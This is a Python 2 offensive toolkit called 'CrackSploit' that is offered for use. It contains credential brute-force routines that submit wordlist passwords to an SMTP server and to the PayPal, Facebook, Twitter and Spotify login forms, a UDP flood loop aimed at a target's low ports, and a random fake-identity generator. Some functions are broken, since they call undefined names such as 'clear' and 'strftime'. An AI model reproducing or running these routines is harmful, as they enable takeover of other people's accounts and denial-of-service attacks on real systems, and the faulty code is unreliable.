#CrackSploit
import mechanize, time, smtplib, ftplib, os, socket, cookielib, random
from time import gmtime
def menu():
	print "  Welcome To \n\n|-------------|\n\n  CrackSploit\n\n|-------------|\n\nEnter Script to load"
menu()
r = raw_input("\n>>> ")
def smtpcrack():
	targserv = raw_input("\n\nEnter SMTP server to attack: ")
	atkport = input("Enter port to attack on: ")
	server = smtplib.SMTP(targserv, atkport)
	server.ehlo()
	server.starttls()
	uname = raw_input("Username/Email: ")
	passfile = raw_input("Password file: ")
	try:
		passfile = open(passfile, "r").readlines()
	except IOError:
		print "Wordlist not found. Exiting..."
		quit()
	for password in passfile:
		try:
			server.login(uname, password)
			print "[+] Password cracked: {}".format(password)
			break
		except smtplib.SMTPAuthenticationError:
		 	print "[!] INVALID PASSWORD: %s" % password
def udpflood():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	t = raw_input("\n\nTarget to attack: ")
	try:
			while True:
				for port in range(1, 1024):
					s.sendto("Data", (t, port))
					print "Sending attack...."
	except KeyboardInterrupt:
		print "\nAttack interrupted! Restarting program...."
		time.sleep(2)
		os.system("clear")
		menu()
	
def paypal():
	br = mechanize.Browser()
	useragents = [('User-agent',
				   'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	clear()
	email = raw_input("Email address: ")
	br.addheaders = [('User-agent', random.choice(useragents))]
	cj = cookielib.LWPCookieJar()
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.set_cookiejar(cj)
	passlist = raw_input("Path to Wordlist: ")
	try:
		passlist = open(passlist, "r")
	except:
		clear()
		print "Wordlist not found!"
		quit()
	url = "https://www.paypal.com/signin"
	br.open(url)
	print "[*] Attack Started at: " + strftime("%a, %d %b %Y %H:%M:%S", gmtime())
	time.sleep(2)
	for password in passlist:
		br.select_form(nr=0)
		br.form['email'] = email
		br.form['login_password'] = password.strip()
		r = br.submit()
		if (r != url) and (not 'signin' in r.geturl()):
			clear()
			print "[+] CREDENTICALS FOUND: " + "\nPassword: " + password.strip() + "\ne-mail: " + email
			print "Thanks for using my tool!"
			break
	else:
		print "[-] Wrong password:", password.strip()
def fakeidgen():
	time.sleep(2)
	rand1 = random.randint(1, 30)
	rand2 = random.randint(1, 12)
	rand3 = random.randint(1950, 2005)
	hobbies = ["Programming", "Playing the piano", "Playing baseball", "Playing the guitar", "Playing video games", "Horse riding", "Cooking"]
	age = random.randint(15, 50)
	jobs = ["Teacher", "Programmer", "Security researcher", "Chef", "Pianist", "Violist", "Personal Trainer", "Shop Manager", "Actor", "Doctor"]
	print "Born: ", rand1, "/", rand2, "/", rand3 , "\nHobby: " , random.choice(hobbies), "\nJob: ", random.choice(jobs), "\nAge: ", age
def fbrt():
	br = mechanize.Browser()
	useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	email = raw_input("Email address/Profile ID: ")
	br.addheaders = [('User-agent', random.choice(useragents))]
	cj = cookielib.LWPCookieJar()
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.set_cookiejar(cj)
	passlist = raw_input("Path to Wordlist: ")
	try:
		passlist = open(passlist, "r")
	except:
		clear()
		print "Wordlist not found!"
		quit()
	url = "https://www.facebook.com/login.php?login_attempt=1"
	br.open(url)
	print "[*] Attack Started at: " + time.strftime ("%a, %d %b %Y %H:%M:%S", gmtime())
	time.sleep(2)
	for password in passlist:
		br.select_form(nr=0)
		br.form['email'] = email
		br.form['pass'] = password.strip()
		r = br.submit()
		if (r != url) and (not 'login_attempt' in r.geturl()):
			print "[+] CREDENTICALS FOUND: " + "\nPassword: " +  password.strip() + "\ne-mail: " + email
			print "Thanks for using my tool!"
			break
		else:
			print "[-] Wrong password:",password.strip()
def twitter():
	br = mechanize.Browser()
	useragents = [('User-agent',
				   'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	email = raw_input("Email address: ")
	br.addheaders = [('User-agent', random.choice(useragents))]
	br.addheaders = [('User-agent', random.choice(useragents))]
	cj = cookielib.LWPCookieJar()
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.set_cookiejar(cj)
	url = "https://twitter.com/login/"
	try:
		passwordlist = raw_input("Enter wordlist to use: ")
	except IOError:
		print
		"Wordlist not found, quitting..."
		quit()
	passwordlist = open(passwordlist, 'r')
	br.open(url)
	for password in passwordlist:
		br.select_form(nr=0)
		br.form['session[username_or_email]'] = email
		br.form['session[password]'] = password.strip()
		r = br.submit()
		if (r != url) and "login" not in r.geturl():
			print "CREDENTICALS FOUND:\n", email + "\n", password
		else:
			print "Wrong password:",password
def spotify():
	br = mechanize.Browser()
	useragents = [('User-agent',
				   'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	email = raw_input("Email address: ")
	br.addheaders = [('User-agent', random.choice(useragents))]
	br.addheaders = [('User-agent', random.choice(useragents))]
	cj = cookielib.LWPCookieJar
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.set_cookiejar(cj)
	url = "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fhu%2Faccount%2Foverview%2F"
	try:
		passwordlist = raw_input("Enter wordlist to use: ")
		passwordlist = open(passwordlist, 'r').readlines()
	except IOError:
		print "Wordlist not found, quitting..."
		quit()
	br.open(url)
	for password in passwordlist:
		br.select_form(nr=0)
		br.form['username'] = email
		br.form['password'] = password
		r = br.submit()
		if (url != r ) and ("login" not in r.geturl()):
			print "[+] Credinticals found:",email + "\n",password
			break
		else:
			print "[-] WRONG Password:",password
def runtools():
	global r
	if r == "load smtpcrack":
		smtpcrack()
	if r == "load fbrt":
		fbrt()
	if r == "load udpflood":
		udpflood()
	if r == "load paypalcracker":
		paypal()
	if r == "load fakeidgen":
		fakeidgen()
	if r == "load twitter account cracker":
		twitter()
	if r == "load spotify account cracker":
		spotify()
runtools()
